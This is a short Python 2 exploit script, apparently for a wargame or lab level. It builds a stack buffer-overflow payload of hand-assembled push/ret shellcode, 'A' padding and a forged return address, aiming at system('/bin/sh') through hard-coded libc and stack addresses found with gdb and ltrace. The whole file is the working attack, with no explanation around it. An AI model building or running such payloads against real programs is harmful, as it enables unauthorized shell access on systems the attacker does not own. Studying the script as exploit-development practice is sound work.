#ltrace buf addr = 0xbffff6d6
#gdb buf addr = 0xbffff6c6
# "/bin/sh" addr = 0xb7f8cc58
#sysaddr = "\xb7\xe6\xb0\x60"[::-1] # addr at system()
#str2secondpad = "F" * 1

binshaddr = "\xb7\xf8\xcc\x58"[::-1]
str2firstpad = "BBBBCCCCHHHHII"
bufaddr = "\xbf\xff\xf6\xe6"[::-1]

str1 = "\x68\x58\xcc\xf8\xb7\x68\xe0\xeb\xe5\xb7\x68\x60\xb0\xe6\xb7\xc3"
str1padding = "A" * (4095 - len(str1)) + "\n"
str1 = str1 + str1padding

str2 = str2firstpad + bufaddr + " \n"

output = str1 + str2
print output
